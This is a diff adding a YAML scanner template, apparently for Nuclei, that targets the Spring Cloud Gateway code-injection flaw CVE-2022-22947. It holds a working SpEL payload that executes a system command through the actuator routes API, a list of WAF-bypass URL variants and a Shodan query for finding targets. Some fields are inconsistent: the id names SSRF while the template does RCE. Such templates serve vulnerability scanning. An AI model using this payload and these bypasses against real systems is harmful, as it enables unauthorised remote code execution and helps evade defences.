@@ -1,0 +1,103 @@
+id: springboot-gateway-ssrf-bypass
+
+info:
+  name: Spring Cloud Gateway RCE (CVE-2022-22947) - WAF Bypass
+  author: shafranpackeer
+  severity: critical
+  description: |
+    Detects Spring Cloud Gateway Server Code Injection (CVE-2022-22947) using various WAF bypass techniques.
+    Allows remote attackers to execute arbitrary code via SpEL injection in routing configuration.
+  reference:
+    - https://www.cve.org/CVERecord?id=CVE-2022-22947
+    - https://tanzu.vmware.com/security/cve-2022-22947
+  classification:
+    cve-id: CVE-2022-22947
+    cwe-id: CWE-94
+  metadata:
+    verified: true
+    max-request: 20
+    shodan-query: title:"Spring Cloud Gateway"
+  tags: springboot,cve,cve2022,rce,injection,gateway,waf-bypass,intrusive
+
+http:
+  - raw:
+      - |
+        POST {{Path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "id": "nuclei-{{rand_base(6)}}",
+          "filters": [{
+            "name": "AddResponseHeader",
+            "args": {
+              "name": "Result",
+              "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream()))}"
+            }
+          }],
+          "uri": "http://example.com"
+        }
+
+      - |
+        POST {{Path}}/refresh HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {}
+
+      - |
+        GET {{Path}}/actuator/gateway/routes/nuclei-{{rand_base(6)}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        DELETE {{Path}}/actuator/gateway/routes/nuclei-{{rand_base(6)}} HTTP/1.1
+        Host: {{Hostname}}
+
+    path:
+      # Standard paths
+      - "{{BaseURL}}/actuator/gateway/routes"
+      - "{{BaseURL}}/gateway/routes"
+
+      # URL encoded variations
+      - "{{BaseURL}}/%61ctuator/gateway/routes"
+      - "{{BaseURL}}/actuator/%67ateway/routes"
+      - "{{BaseURL}}/actuator/gateway/%72outes"
+
+      # Semicolon injection
+      - "{{BaseURL}}/actuator;/gateway/routes"
+      - "{{BaseURL}}/actuator/gateway;/routes"
+      - "{{BaseURL}}/actuator/gateway/routes;.json"
+
+      # Path traversal
+      - "{{BaseURL}}/./actuator/gateway/routes"
+      - "{{BaseURL}}//actuator/gateway/routes"
+      - "{{BaseURL}}/actuator/../actuator/gateway/routes"
+
+      # Alternate base paths
+      - "{{BaseURL}}/manage/gateway/routes"
+      - "{{BaseURL}}/management/gateway/routes"
+      - "{{BaseURL}}/admin/gateway/routes"
+      - "{{BaseURL}}/mgmt/gateway/routes"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_3
+        words:
+          - "uid="
+          - "gid="
+          - "groups="
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: command-output
+        regex:
+          - 'uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)'
+        part: body_3
